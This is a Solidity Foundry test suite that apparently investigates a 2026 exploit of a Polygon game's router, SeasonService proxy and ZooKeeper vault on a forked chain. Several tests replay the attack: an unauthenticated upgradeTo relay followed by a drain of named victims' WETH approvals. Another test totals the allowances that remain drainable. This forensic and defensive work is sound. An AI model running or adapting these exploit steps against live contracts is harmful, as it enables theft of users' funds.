// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {MaliciousSeasonImpl, DcHelper} from "../src/Attackers.sol";

// ============================================================================================
// The Red Village (Polygon) -- Z3-H4 deep dive.
//
// Finding: PolygonTRVRouter.forwardRequest(serviceName, serviceId, data) was public with no
// caller gate while the router held `_authorizeUpgrade` on the SeasonService UUPS proxy =>
// anyone could relay upgradeTo(maliciousImpl); the malicious impl (running as the proxy) held
// transferERC20In/Out on TRVZooKeeper and swept 299 players' standing WETH approvals
// (31.426 WETH, ~$80.7K, 2026-09-21, tx 0xac0666c5.. / 0x3730141a..).
//
// This suite determines the state TODAY (read-only fork; no mainnet transactions):
//   T1  router forwardRequest path -- bricked ("stopped" impl since block 94,241,212)
//   T2  SeasonService still runs the ATTACKER's impl (0xa3822cdf); its upgradeTo/delegatecall
//       backdoors are gated to tx.origin == attacker EOAs (0xa566.. / 0xe3c4..) -> not fresh-attacker usable
//   T3  ZooKeeper roles: hasRole(SeasonService, ZooKeeper, transferERC20*) == TRUE pre-incident
//       (block 94,200,340) and FALSE now (all revoked in the team's 94.22M-block response)
//   T4  re-arm: even with a malicious impl installed, the drain is BLOCKED today by the revoked
//       roles; re-granting the role (privileged AccessControl-owner action) makes it drain instantly
//   T5  the ZooKeeper owner EOA can pull standing approvals (privileged path, P)
//   T6  historical full-chain replay at block 94,200,340: a FRESH caller relays upgradeTo through
//       the router and drains (proves the path was permissionless pre-incident)
//   T7  full allowance+balance sweep over every address that ever approved WETH to the ZooKeeper
// ============================================================================================

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRouterLike {
    function forwardRequest(string calldata serviceName, string calldata serviceId, bytes calldata data) external;
}

interface IAccessControlLike {
    function hasRole(address account, address contract_, string calldata methodInfo) external view returns (bool);
    function getMembersByRole(address contract_, string calldata methodInfo) external view returns (address[] memory);
    function grantRoles(address account, address contract_, string[] calldata methodsInfo) external;
    function owner() external view returns (address);
}

interface IZooKeeperLike {
    function transferERC20In(address _currency, address _from, uint256 _amount) external;
    function transferERC20Out(address _currency, address _to, uint256 _amount) external;
    function owner() external view returns (address);
}

interface ISeasonProxyLike {
    function upgradeTo(address newImplementation) external;
}

struct Call3 {
    address target;
    bool allowFailure;
    bytes callData;
}

struct Result3 {
    bool success;
    bytes returnData;
}

interface IMulticall3 {
    function aggregate3(Call3[] calldata calls) external payable returns (Result3[] memory);
}

contract RedVillageTest is Test {
    // --- deployed addresses (Polygon mainnet, chainid 137) ---
    address internal constant ROUTER = 0xc97dCb0492412bFBBf47332F1B1b49e177e8f15C;
    address internal constant SEASON = 0xb172E15974FEAAe221EbC0860B578Dd7B6B06b77;
    address internal constant ZK = 0x426d27190A2DdB87f1C6235F710e159a0A3774D4;
    address internal constant AC = 0x3f0B50B7A270de536D5De35C11C2613284C4304e;
    address internal constant WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address internal constant MULTICALL3 = 0xcA11bde05977b3631167028862bE2a173976CA11;

    // --- actors ---
    address internal constant ATT_UPGRADER = 0xa566592CB94475BaF5B46Ce373A260dfC9d0dF3F; // tx.origin gate of upgradeTo
    address internal constant ATT_AUTHORIZED = 0xe3c4e2ea29cbE47aE205F9C18CBcb0C8C51bfdec; // tx.origin gate of delegatecall
    address internal constant ZK_OWNER = 0xBd28b1786060AdE61f0bFcEde736a80fC64ba13c;
    address internal constant FRESH = address(0xF00d000000000000000000000000000000000F00);

    bytes32 internal constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address internal constant ATTACKER_IMPL = 0xA3822CdF2Bb59CeFC7E70Fa5d693B7E9fBc50aFa;

    uint256 internal constant PRE_DRAIN_BLOCK = 94_200_867; // 1 block before the drain tx (impl already taken over)
    uint256 internal constant PRE_ATTACK_BLOCK = 94_200_340; // 1 block before the attacker's upgrade relay

    // revert selectors of the attacker impl's custom errors
    bytes4 internal constant ERR_NOT_UPGRADER = 0xa4174502;
    bytes4 internal constant ERR_NOT_AUTHORIZED = 0xea8e4eb5;

    string internal rpc;

    function setUp() public {
        rpc = vm.envOr("POLYGON_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = vm.envOr("FORK_RPC_URL_POLYGON", string(""));
        if (bytes(rpc).length == 0) rpc = "https://polygon.drpc.org";
        vm.createSelectFork(rpc);
    }

    function _implSlot() internal view returns (address impl) {
        impl = address(uint160(uint256(vm.load(SEASON, IMPL_SLOT))));
    }

    // -----------------------------------------------------------------------------------------
    // T1: the router relay path is bricked today
    // -----------------------------------------------------------------------------------------
    function test_T1_router_forwardRequest_is_bricked() public {
        // the router proxy's impl was replaced by a "stopped" brick at block 94,241,212
        // (tx 0xbcc4f570.. by team EOA 0xcd3b6008..) -- every call except proxiableUUID reverts
        address stoppedImpl = address(uint160(uint256(vm.load(ROUTER, IMPL_SLOT))));
        emit log_named_address("router impl today", stoppedImpl);

        vm.prank(FRESH, FRESH);
        vm.expectRevert(bytes("stopped"));
        IRouterLike(ROUTER).forwardRequest(
            "Season",
            "SeasonService",
            abi.encodeWithSignature("upgradeTo(address)", address(0xdead))
        );

        // and it can never be un-bricked: the stopped impl exposes no upgrade function
        vm.prank(FRESH, FRESH);
        (bool ok,) = ROUTER.call(abi.encodeWithSignature("upgradeTo(address)", FRESH));
        assertFalse(ok, "router upgradeTo must not exist on the stopped impl");
    }

    // -----------------------------------------------------------------------------------------
    // T2: SeasonService still runs the attacker's impl; backdoors are tx.origin-gated
    // -----------------------------------------------------------------------------------------
    function test_T2a_season_upgrade_gated_to_attacker_origin() public {
        assertEq(_implSlot(), ATTACKER_IMPL, "impl must still be the attacker's");

        MaliciousSeasonImpl malicious = new MaliciousSeasonImpl();

        // fresh caller cannot upgrade -> NotUpgrader()
        vm.prank(FRESH, FRESH);
        vm.expectRevert(ERR_NOT_UPGRADER);
        ISeasonProxyLike(SEASON).upgradeTo(address(malicious));

        // attacker tx.origin CAN upgrade (backdoor is private but live)
        vm.prank(ATT_UPGRADER, ATT_UPGRADER);
        ISeasonProxyLike(SEASON).upgradeTo(address(malicious));
        assertEq(_implSlot(), address(malicious), "attacker can still replace the impl");
    }

    function test_T2b_season_delegatecall_gated_to_attacker_origin() public {
        DcHelper helper = new DcHelper();
        bytes memory payload = abi.encodeWithSignature(
            "delegatecall(address,bytes)", address(helper), abi.encodeWithSelector(DcHelper.marker.selector)
        );

        // fresh caller -> NotAuthorized()
        vm.prank(FRESH, FRESH);
        (bool ok1, bytes memory ret1) = SEASON.call(payload);
        assertFalse(ok1, "fresh caller must not pass the delegatecall gate");
        assertEq(bytes4(ret1), ERR_NOT_AUTHORIZED, "revert must be NotAuthorized()");

        // attacker tx.origin -> delegatecall executes in the proxy's context
        vm.prank(ATT_AUTHORIZED, ATT_AUTHORIZED);
        (bool ok2, bytes memory ret2) = SEASON.call(payload);
        assertTrue(ok2, "attacker delegatecall must succeed");
        // the impl returns the delegatecall result wrapped as ABI `bytes`
        bytes memory inner = abi.decode(ret2, (bytes));
        assertEq(abi.decode(inner, (bytes32)), keccak256("trv-delegatecall-backdoor"));
    }

    // -----------------------------------------------------------------------------------------
    // T3: ZooKeeper role state -- revoked today, live before the incident
    // -----------------------------------------------------------------------------------------
    function test_T3a_zookeeper_roles_revoked_today() public {
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC20In"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC20Out"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC721In"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC721Out"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC1155In"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC1155Out"));
        assertFalse(IAccessControlLike(AC).hasRole(SEASON, ZK, "setAccessControlProvider"));
        assertEq(IAccessControlLike(AC).getMembersByRole(ZK, "transferERC20In").length, 0);
        assertEq(IAccessControlLike(AC).getMembersByRole(ZK, "transferERC20Out").length, 0);

        // and the call itself reverts from the SeasonService context
        vm.prank(SEASON, SEASON);
        vm.expectRevert(bytes("Caller does not have permission"));
        IZooKeeperLike(ZK).transferERC20In(WETH, FRESH, 1);
    }

    function test_T3b_zookeeper_roles_were_live_before_incident() public {
        vm.createSelectFork(rpc, PRE_DRAIN_BLOCK);
        assertTrue(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC20In"));
        assertTrue(IAccessControlLike(AC).hasRole(SEASON, ZK, "transferERC20Out"));
        // the relay role existed too
        assertTrue(IAccessControlLike(AC).hasRole(ROUTER, SEASON, "_authorizeUpgrade"));
    }

    // -----------------------------------------------------------------------------------------
    // T4: re-arm quantification -- blocked today, instantly drainable if roles are re-granted
    // -----------------------------------------------------------------------------------------
    function test_T4a_rearm_drain_blocked_today_even_with_backdoor() public {
        // simulate a re-funded player re-approving the ZooKeeper (the re-arm event)
        address player = address(0xBEEF00000000000000000000000000000000BEEf);
        vm.deal(player, 1 ether);
        deal(WETH, player, 5 ether);
        vm.prank(player, player);
        IERC20Like(WETH).approve(ZK, 5 ether);

        // attacker (tx.origin-gated backdoor) installs a malicious impl
        MaliciousSeasonImpl malicious = new MaliciousSeasonImpl();
        vm.prank(ATT_UPGRADER, ATT_UPGRADER);
        ISeasonProxyLike(SEASON).upgradeTo(address(malicious));

        address[] memory players = new address[](1);
        players[0] = player;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5 ether;

        // the drain STILL reverts: the ZooKeeper no longer authorizes the SeasonService
        vm.prank(FRESH, FRESH);
        vm.expectRevert(bytes("Caller does not have permission"));
        MaliciousSeasonImpl(SEASON).drain(WETH, ZK, FRESH, players, amounts);

        assertEq(IERC20Like(WETH).balanceOf(ZK), 0);
    }

    function test_T4b_rearm_drain_works_once_roles_are_regranted() public {
        address player = address(0xBEEF00000000000000000000000000000000BEEf);
        vm.deal(player, 1 ether);
        deal(WETH, player, 5 ether);
        vm.prank(player, player);
        IERC20Like(WETH).approve(ZK, 5 ether);

        MaliciousSeasonImpl malicious = new MaliciousSeasonImpl();
        vm.prank(ATT_UPGRADER, ATT_UPGRADER);
        ISeasonProxyLike(SEASON).upgradeTo(address(malicious));

        // CONDITION: the AccessControl owner (privileged) re-grants the ZooKeeper roles
        address acOwner = IAccessControlLike(AC).owner();
        string[] memory roles = new string[](2);
        roles[0] = "transferERC20In";
        roles[1] = "transferERC20Out";
        vm.prank(acOwner, acOwner);
        IAccessControlLike(AC).grantRoles(SEASON, ZK, roles);

        address[] memory players = new address[](1);
        players[0] = player;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 5 ether;

        // now any caller can drain every live approval
        vm.prank(FRESH, FRESH);
        MaliciousSeasonImpl(SEASON).drain(WETH, ZK, FRESH, players, amounts);

        assertEq(IERC20Like(WETH).balanceOf(FRESH), 5 ether, "re-armed drain succeeded");
        assertEq(IERC20Like(WETH).balanceOf(player), 0);
    }

    // -----------------------------------------------------------------------------------------
    // T5: the ZooKeeper owner can pull standing approvals (privileged path)
    // -----------------------------------------------------------------------------------------
    function test_T5_zookeeper_owner_path_is_privileged() public {
        address player = address(0xCAfe00000000000000000000000000000000CAfe);
        deal(WETH, player, 3 ether);
        vm.prank(player, player);
        IERC20Like(WETH).approve(ZK, 3 ether);

        // unprivileged caller cannot
        vm.prank(FRESH, FRESH);
        vm.expectRevert(bytes("Caller does not have permission"));
        IZooKeeperLike(ZK).transferERC20In(WETH, player, 3 ether);

        // owner can
        uint256 ownerBefore = IERC20Like(WETH).balanceOf(ZK_OWNER);
        vm.startPrank(ZK_OWNER, ZK_OWNER);
        IZooKeeperLike(ZK).transferERC20In(WETH, player, 3 ether);
        IZooKeeperLike(ZK).transferERC20Out(WETH, ZK_OWNER, 3 ether);
        vm.stopPrank();
        assertEq(IERC20Like(WETH).balanceOf(ZK_OWNER) - ownerBefore, 3 ether);
    }

    // -----------------------------------------------------------------------------------------
    // T6: historical full-chain replay at block 94,200,867 -- fresh caller, permissionless relay
    // -----------------------------------------------------------------------------------------
    function test_T6_historical_permissionless_replay() public {
        // fork BEFORE the attacker's upgrade relay: the SeasonService still runs the original impl,
        // whose _authorizeUpgrade accepts the router (hasRole(router, SeasonService, "_authorizeUpgrade") == true)
        vm.createSelectFork(rpc, PRE_ATTACK_BLOCK);

        uint256 vaultPre = IERC20Like(WETH).balanceOf(ZK);
        emit log_named_decimal_uint("ZooKeeper WETH at pre-attack block", vaultPre, 18);

        MaliciousSeasonImpl malicious = new MaliciousSeasonImpl();

        // 1) FRESH caller relays upgradeTo through the ungated forwardRequest
        vm.prank(FRESH, FRESH);
        IRouterLike(ROUTER).forwardRequest(
            "Season", "SeasonService", abi.encodeWithSignature("upgradeTo(address)", address(malicious))
        );
        assertEq(_implSlot(), address(malicious), "upgrade relayed by fresh caller");

        // 2) drain the first 10 documented victims (amounts from the real drain tx)
        (address[] memory players, uint256[] memory amounts, uint256 sum) = _first10Victims();
        uint256 freshBefore = IERC20Like(WETH).balanceOf(FRESH);
        vm.prank(FRESH, FRESH);
        MaliciousSeasonImpl(SEASON).drain(WETH, ZK, FRESH, players, amounts);

        uint256 gained = IERC20Like(WETH).balanceOf(FRESH) - freshBefore;
        emit log_named_decimal_uint("fresh caller gained", gained, 18);
        assertEq(gained, sum + vaultPre, "drained victim approvals + pre-existing vault balance");
        assertEq(IERC20Like(WETH).balanceOf(ZK), 0);
    }

    function _first10Victims() internal pure returns (address[] memory players, uint256[] memory amounts, uint256 sum) {
        players = new address[](10);
        amounts = new uint256[](10);
        players[0] = 0x9F11486f80982663575D606afC28182a76E46a07;
        amounts[0] = 9973624500000000000;
        players[1] = 0x86f3b705B32411b8bf0F839E12FCdfD0125B51c2;
        amounts[1] = 5646407105892860026;
        players[2] = 0x4523634a87414e6975C4b33079396747C3727592;
        amounts[2] = 3559868015987932559;
        players[3] = 0x9dA9ED40BfA71F98A90151f0b1272fe293a75EBB;
        amounts[3] = 995302774875814611;
        players[4] = 0x821d9A3F2Ea71E19c862218f4B041FA5a2827490;
        amounts[4] = 883277064922616948;
        players[5] = 0xA54181E56573d74e7f5278E7bA7dbFFC74DD5fde;
        amounts[5] = 591351335400000000;
        players[6] = 0xdf7280652f75f434358F87308bF57874af45E60f;
        amounts[6] = 500412303163856409;
        players[7] = 0xE41c8c15cB91BA2F195c2A871343286CB3D83653;
        amounts[7] = 457288113558357988;
        players[8] = 0xc42568154fD372bEa66e9F8fD246dd1f90C7C1bC;
        amounts[8] = 437998613834197167;
        players[9] = 0xA0e9CB07d36953f3a2065BCDEF7Fb1a6F43D8852;
        amounts[9] = 415842766951572535;
        for (uint256 i = 0; i < 10; i++) sum += amounts[i];
    }

    struct SweepAcc {
        uint256 withAllowance;
        uint256 withAllowanceAndBalance;
        uint256 totalAllowance;
        uint256 drainableNow;
        address topOwner;
        uint256 topAmount;
    }

    // -----------------------------------------------------------------------------------------
    // T7: full allowance+balance sweep over every address that ever approved WETH to the ZooKeeper
    // -----------------------------------------------------------------------------------------
    function test_T7_full_allowance_balance_sweep() public {
        string memory path = "../analysis/weth_approval_owners.json";
        if (!vm.exists(path)) {
            emit log("owners file missing -- sweep skipped");
            return;
        }
        address[] memory owners = vm.parseJsonAddressArray(vm.readFile(path), ".owners");
        emit log_named_uint("owners to check", owners.length);

        SweepAcc memory acc;
        uint256 chunk = 400;
        for (uint256 start = 0; start < owners.length; start += chunk) {
            uint256 end = start + chunk;
            if (end > owners.length) end = owners.length;
            _sweepChunk(owners, start, end, acc);
        }

        emit log_named_uint("owners with allowance > 0", acc.withAllowance);
        emit log_named_decimal_uint("total residual allowance (WETH)", acc.totalAllowance, 18);
        emit log_named_uint("owners with allowance AND balance > 0", acc.withAllowanceAndBalance);
        emit log_named_decimal_uint("drainable now = sum(min(balance, allowance)) WETH", acc.drainableNow, 18);
        if (acc.topOwner != address(0)) {
            emit log_named_address("top drainable owner", acc.topOwner);
            emit log_named_decimal_uint("top drainable amount (WETH)", acc.topAmount, 18);
        }

        string memory out = string.concat(
            "{\n  \"owners_checked\": ",
            vm.toString(owners.length),
            ",\n  \"owners_with_allowance\": ",
            vm.toString(acc.withAllowance),
            ",\n  \"total_residual_allowance_wei\": \"",
            vm.toString(acc.totalAllowance),
            "\",\n  \"owners_with_allowance_and_balance\": ",
            vm.toString(acc.withAllowanceAndBalance),
            ",\n  \"drainable_now_wei\": \"",
            vm.toString(acc.drainableNow),
            "\",\n  \"top_drainable_owner\": \"",
            vm.toString(acc.topOwner),
            "\",\n  \"top_drainable_wei\": \"",
            vm.toString(acc.topAmount),
            "\"\n}\n"
        );
        vm.writeFile("../ci-out/sweep_results.json", out);
    }

    function _sweepChunk(address[] memory owners, uint256 start, uint256 end, SweepAcc memory acc) internal {
        Call3[] memory calls = new Call3[]((end - start) * 2);
        for (uint256 i = start; i < end; i++) {
            uint256 k = (i - start) * 2;
            calls[k].target = WETH;
            calls[k].allowFailure = true;
            calls[k].callData = abi.encodeWithSignature("allowance(address,address)", owners[i], ZK);
            calls[k + 1].target = WETH;
            calls[k + 1].allowFailure = true;
            calls[k + 1].callData = abi.encodeWithSignature("balanceOf(address)", owners[i]);
        }
        Result3[] memory results = IMulticall3(MULTICALL3).aggregate3(calls);
        for (uint256 i = start; i < end; i++) {
            uint256 k = (i - start) * 2;
            uint256 allowance = results[k].success ? abi.decode(results[k].returnData, (uint256)) : 0;
            if (allowance == 0) continue;
            acc.withAllowance++;
            acc.totalAllowance += allowance;
            uint256 balance = results[k + 1].success ? abi.decode(results[k + 1].returnData, (uint256)) : 0;
            if (balance == 0) continue;
            acc.withAllowanceAndBalance++;
            uint256 drainable = allowance < balance ? allowance : balance;
            acc.drainableNow += drainable;
            if (drainable > acc.topAmount) {
                acc.topAmount = drainable;
                acc.topOwner = owners[i];
            }
        }
    }
}
